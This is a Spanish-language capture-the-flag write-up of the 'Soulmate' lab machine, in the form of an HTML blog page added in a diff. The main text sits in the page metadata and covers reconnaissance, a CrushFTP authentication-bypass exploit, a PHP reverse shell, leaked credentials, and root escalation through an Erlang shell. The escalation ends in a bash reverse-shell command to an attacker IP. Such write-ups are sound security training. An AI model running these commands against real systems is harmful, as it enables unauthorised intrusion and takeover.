@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Soulmate | Borhub Blog</title>
+<meta name="keywords" content="Easy, Linux, VHOST, SUDO">
+<meta name="description" content="
+Reconocimiento
+❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.169.204 -oG ports
+[sudo] contraseña para borhub:
+
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:03 &#43;0200
+Initiating SYN Stealth Scan at 16:03
+Scanning 10.129.169.204 [65535 ports]
+Discovered open port 80/tcp on 10.129.169.204
+Discovered open port 22/tcp on 10.129.169.204
+Discovered open port 22/tcp on 10.129.169.204
+Discovered open port 80/tcp on 10.129.169.204
+Completed SYN Stealth Scan at 16:03, 15.22s elapsed (65535 total ports)
+
+Nmap scan report for 10.129.169.204
+Host is up, received user-set (0.049s latency).
+Scanned at 2025-09-08 16:03:39 CEST for 15s
+Not shown: 63623 closed tcp ports (reset), 1910 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT STATE SERVICE REASON
+22/tcp open ssh syn-ack ttl 63
+80/tcp open http syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
+Raw packets sent: 82986 (3.651MB) | Rcvd: 65838 (2.634MB)
+❯ ports.py ports
+
+🔍 Puertos encontrados:
+➜ 22
+➜ 80
+¡Puertos copiados en el portapapeles!
+❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted
+
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:05 &#43;0200
+Nmap scan report for 10.129.169.204
+Host is up (0.30s latency).
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soulmate.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds
+Enumeración web
+sudo nano /etc/hosts
+
+whatweb http://soulmate.htb
+">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/soulmate/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.27492627d52d32d617e2faf58e652b2e2633796e5697eb3efd37682f981ae0f1.css" integrity="sha256-J0kmJ9UtMtYX4vr1jmUrLiYzeW5Wl&#43;s&#43;/TdoL5ga4PE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/soulmate/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/soulmate/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Soulmate">
+  <meta property="og:description" content="
+Reconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.169.204 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:03 &#43;0200 Initiating SYN Stealth Scan at 16:03 Scanning 10.129.169.204 [65535 ports] Discovered open port 80/tcp on 10.129.169.204 Discovered open port 22/tcp on 10.129.169.204 Discovered open port 22/tcp on 10.129.169.204 Discovered open port 80/tcp on 10.129.169.204 Completed SYN Stealth Scan at 16:03, 15.22s elapsed (65535 total ports) Nmap scan report for 10.129.169.204 Host is up, received user-set (0.049s latency). Scanned at 2025-09-08 16:03:39 CEST for 15s Not shown: 63623 closed tcp ports (reset), 1910 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds Raw packets sent: 82986 (3.651MB) | Rcvd: 65838 (2.634MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:05 &#43;0200 Nmap scan report for 10.129.169.204 Host is up (0.30s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soulmate.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds Enumeración web sudo nano /etc/hosts whatweb http://soulmate.htb ">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Vhost">
+    <meta property="article:tag" content="SUDO">
+    <meta property="og:image" content="https://borhuub.github.io/%3C/static/logo_machines/soulmate.png%3E">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/%3C/static/logo_machines/soulmate.png%3E">
+<meta name="twitter:title" content="Soulmate">
+<meta name="twitter:description" content="
+Reconocimiento
+❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.169.204 -oG ports
+[sudo] contraseña para borhub:
+
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:03 &#43;0200
+Initiating SYN Stealth Scan at 16:03
+Scanning 10.129.169.204 [65535 ports]
+Discovered open port 80/tcp on 10.129.169.204
+Discovered open port 22/tcp on 10.129.169.204
+Discovered open port 22/tcp on 10.129.169.204
+Discovered open port 80/tcp on 10.129.169.204
+Completed SYN Stealth Scan at 16:03, 15.22s elapsed (65535 total ports)
+
+Nmap scan report for 10.129.169.204
+Host is up, received user-set (0.049s latency).
+Scanned at 2025-09-08 16:03:39 CEST for 15s
+Not shown: 63623 closed tcp ports (reset), 1910 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT STATE SERVICE REASON
+22/tcp open ssh syn-ack ttl 63
+80/tcp open http syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
+Raw packets sent: 82986 (3.651MB) | Rcvd: 65838 (2.634MB)
+❯ ports.py ports
+
+🔍 Puertos encontrados:
+➜ 22
+➜ 80
+¡Puertos copiados en el portapapeles!
+❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted
+
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:05 &#43;0200
+Nmap scan report for 10.129.169.204
+Host is up (0.30s latency).
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soulmate.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds
+Enumeración web
+sudo nano /etc/hosts
+
+whatweb http://soulmate.htb
+">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Soulmate",
+      "item": "https://borhuub.github.io/writeups/soulmate/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Soulmate",
+  "name": "Soulmate",
+  "description": "\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.169.204 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:03 +0200 Initiating SYN Stealth Scan at 16:03 Scanning 10.129.169.204 [65535 ports] Discovered open port 80/tcp on 10.129.169.204 Discovered open port 22/tcp on 10.129.169.204 Discovered open port 22/tcp on 10.129.169.204 Discovered open port 80/tcp on 10.129.169.204 Completed SYN Stealth Scan at 16:03, 15.22s elapsed (65535 total ports) Nmap scan report for 10.129.169.204 Host is up, received user-set (0.049s latency). Scanned at 2025-09-08 16:03:39 CEST for 15s Not shown: 63623 closed tcp ports (reset), 1910 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds Raw packets sent: 82986 (3.651MB) | Rcvd: 65838 (2.634MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:05 +0200 Nmap scan report for 10.129.169.204 Host is up (0.30s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soulmate.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds Enumeración web sudo nano /etc/hosts whatweb http://soulmate.htb ",
+  "keywords": [
+    "Easy", "Linux", "VHOST", "SUDO"
+  ],
+  "articleBody": "\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.169.204 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:03 +0200 Initiating SYN Stealth Scan at 16:03 Scanning 10.129.169.204 [65535 ports] Discovered open port 80/tcp on 10.129.169.204 Discovered open port 22/tcp on 10.129.169.204 Discovered open port 22/tcp on 10.129.169.204 Discovered open port 80/tcp on 10.129.169.204 Completed SYN Stealth Scan at 16:03, 15.22s elapsed (65535 total ports) Nmap scan report for 10.129.169.204 Host is up, received user-set (0.049s latency). Scanned at 2025-09-08 16:03:39 CEST for 15s Not shown: 63623 closed tcp ports (reset), 1910 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds Raw packets sent: 82986 (3.651MB) | Rcvd: 65838 (2.634MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:05 +0200 Nmap scan report for 10.129.169.204 Host is up (0.30s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soulmate.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds Enumeración web sudo nano /etc/hosts whatweb http://soulmate.htb Una vez entramos a la web nos encontramos una pagina de citas.\nVemos que nos podemos registrar así que vamos a hacerlo para ver que podemos hacer en la página, aunque no encuentro nada interesante por el momento.\nEnumerando VHOSTS - Gobuster Es entonces cuando me pongo a enumerar vhosts y encuentro el subdominio ftp, en el que esta corriendo CrushFTP.\ngobuster vhost -u http://soulmate.htb -w --append-domain CrushFTP es un servidor propietario de transferencia de archivos multiplataforma y multiprotocolo.\nCrushFTP auth bypass - CVE-2025-31161 https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation\nPrimero probamos que la página sea vulnerable a este CVE listando los usuarios de la página web mediante la función getUserList.\nPara llevar a cabo el bypass se necesitan los siguientes parámetros:\nAuthorization\": \"AWS4-HMAC-SHA256 Credential=crushadmin/ Coger los ultimo 4 parámetros de la cookie de inicio de sesión y ponerla como c2f. interceptar la petición /function/ para poder manipular el contenido. Una vez comprobado que el host es vulnerable, vamos a usar un POC para añadir un nuevo usuario a la web como administrador.\nUna vez me clono el repositorio, indicamos la el nombre del v-host, y el nombre del administrador por defecto crushadmin que se añadirá la cabezera Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/. Luego le indicamos el nombre y la contraseña del usuario que se creará como administrador.\nY ejecutamos el script para conseguir crear nuestro usuario malicioso.\npython3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user pwn --password pwn Una vez dentro de nuestro usuario como administrador vemos en el apartado admin que podemos gestionar permisos de los usuarios e incluso generarles nuevas contraseñas.\nEntonces nuestro siguiente paso es cambiar-le la contraseña al usuario ben, y luego ya que tenemos permisos para añadir archivos php. Subir una revershe shell en php.\nLe cambiamos la contraseña a ben:\nIniciamos sesión como ben y subimos el archivo shell.php para luego ejecutarlo lanzando una petición http a la url donde se aloja el archivo.\nY nos llega la shell a nuestro listener ademas vemos que nuestro usuario actual www-data.\nMovimiento lateral Con lo cual nos ponemos a buscar algún tipo de credencial o archivo .db para conseguir obtener las credenciales validas del usuario ben.\nEncontramos un archivo .db y nos lo pasamos a nuestra máquina atacante para sacar las credenciales cómodamente.\nUna vez tenemos la el archivo lo consultamos y vemos un hash que vamos a tratar de crackear.\nLuego de haber intentado crackear el hash, no funciona. Entonces me pongo a enumerar el sistema manualmente además de con el comando find + grep para tratar de buscar credenciales pero no tengo suerte.\nCon lo cual lo siguiente que se me ocurre es lanzar un LinPeas para ver si me encuentra algún tipo de información que yo pueda estar dando por alto.\nUna vez lanzado el linpeas, en el apartado de posibles ejecutables añadidos por el usuario encontramos la carpeta /erlang/ y /erlang_login/.\nEn un principio pruebo a buscar el nombre ben en erlang_login porque porque es posible tenga algún tipo de credenciales en los archivos.\nEntonces al hacer la búsqueda nos indica que existe esa cadena de caracteres en start.escript.\nben:HouseH0ldings998\nEntonces nos conectamos a través de ssh y conseguimos la user flag.\nEscalada de privilegios Haciendo la enumeración en el sistema, vemos que no tenemos ningún tipo de permiso para ejecutar comandos como usuario root, ni tampoco existen archivos con permisos SUID que no sean los comunes.\nsudo -l find / -perm -4000 2\u003e/dev/null Con lo cual el siguiente paso que damos es enumerar los puertos que están corriendo internamente.\nnetstat -ano | grep LISTEN Lo primero que hago son revisar los puertos que podrían tener páginas web de administración del sistema pero no encuentro nada. Entonces enumerando puertos con nc, el puerto 2222 nos envía el siguiente banner indicándonos que en ese puerto esta corriendo un puerto ssh-Erlang.\nnc -nv 127.0.0.1 2222 Con lo cual vamos a conectarnos a este puerto 2222 a través de ssh utilizando las credenciales que tenemos para poder enumerarlo.\nssh ben@127.0.0.1 -p 2222 Explotando la capacidad de ejecutar comandos y los permisos a través de la shell Erlang Vemos que nos hemos podido conectar y que tenemos la Erlang shell, entonces investigando sobre que comandos podemos ejecutar en la shell de Erlang descubro que tenemos una opción para ejecutar comandos en el sistema.\nLa primera prueba que realizo es ejecutar un id para comprobar que funcione y con que usuario estamos ejecutándolo.\nos:cmd(\"id\"). Si queremos usando file: podemos leer ya el contenido de la root.txt\nfile:read_file(\"/root/root.txt\"). Aunque nuestro objetivo real es conseguir una shell completamente interactiva como root.\nos:cmd(\"bash -c 'bash -i \u003e\u0026/dev/tcp/10.10.14.105/4444 0\u003e\u00261'\"). nc -lvnp 4444 ",
+  "wordCount" : "1062",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/%3C/static/logo_machines/soulmate.png%3E","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/soulmate/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/certs/" title="Certifications">
+                    <span>Certifications</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Soulmate
+    </h1>
+    <div class="post-meta"><span>5 min</span>&nbsp;·&nbsp;<span>1062 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a><ul>
+                        
+                <li>
+                    <a href="#enumerando-vhosts---gobuster" aria-label="Enumerando VHOSTS - Gobuster">Enumerando VHOSTS - Gobuster</a></li>
+                <li>
+                    <a href="#crushftp-auth-bypass---cve-2025-31161" aria-label="CrushFTP auth bypass - CVE-2025-31161">CrushFTP auth bypass - CVE-2025-31161</a></li>
+                <li>
+                    <a href="#movimiento-lateral" aria-label="Movimiento lateral">Movimiento lateral</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#explotando-la-capacidad-de-ejecutar-comandos-y-los-permisos-a-trav%c3%a9s-de-la-shell-erlang" aria-label="Explotando la capacidad de ejecutar comandos y los permisos a través de la shell Erlang">Explotando la capacidad de ejecutar comandos y los permisos a través de la shell Erlang</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="soulmate_machine" loading="lazy" src="/img/soulmate/soulmate_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.129.169.204 -oG ports
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-09-08 16:03 +0200
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 16:03
+</span></span><span class="line"><span class="cl">Scanning 10.129.169.204 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.129.169.204
+</span></span><span class="line"><span class="cl">Discovered open port 22/tcp on 10.129.169.204
+</span></span><span class="line"><span class="cl">Discovered open port 22/tcp on 10.129.169.204
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.129.169.204
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 16:03, 15.22s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.169.204
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.049s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-09-08 16:03:39 CEST <span class="k">for</span> 15s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">63623</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, <span class="m">1910</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp open ssh syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp open http syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 15.29 seconds
+</span></span><span class="line"><span class="cl">Raw packets sent: <span class="m">82986</span> <span class="o">(</span>3.651MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65838</span> <span class="o">(</span>2.634MB<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">➜ <span class="m">22</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">80</span>
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-09-08 16:05 +0200
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.169.204
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ <span class="m">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://soulmate.htb/
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
